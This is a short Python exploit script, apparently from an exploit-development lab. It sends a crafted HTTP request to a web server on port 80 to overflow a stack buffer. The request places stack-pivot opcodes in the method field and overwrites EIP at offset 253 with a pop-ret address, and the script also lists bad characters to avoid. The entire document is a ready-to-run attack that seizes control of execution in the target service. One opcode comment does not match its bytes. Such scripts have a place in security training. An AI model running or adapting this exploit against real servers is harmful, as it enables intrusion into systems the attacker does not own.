#!/usr/bin/env python3

import socket
import sys
import subprocess
from struct import pack

try:
    if len(sys.argv) < 2:
        server = "192.168.185.10"
    else:
        server = sys.argv[1]
    port = 80
    size = 260
    bad_char_values = b"\x00\x25\x0a\x0d"
    eip_offset = 253

    # Jump to the first stage.
    httpMethod = b"\x83\xC4\x46"  # add esp,byte +0x45
    httpMethod += b"\x83\xC4\x23"  # add esp,byte +0x23
    httpMethod += b"\x54"  # push esp"
    httpMethod += b"\xC3"  # ret
    httpMethod += b" /"
    inputBuffer = b"\x41" * eip_offset
    # EIP control To pop return -> 0x0041eb74
    inputBuffer += b"\x74\xeb\x41"
    # inputBuffer += b"\x43" * (size - len(inputBuffer))
    httpEndRequest = b"\r\n\r\n"

    buf = httpMethod + inputBuffer + httpEndRequest

    print("Sending buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")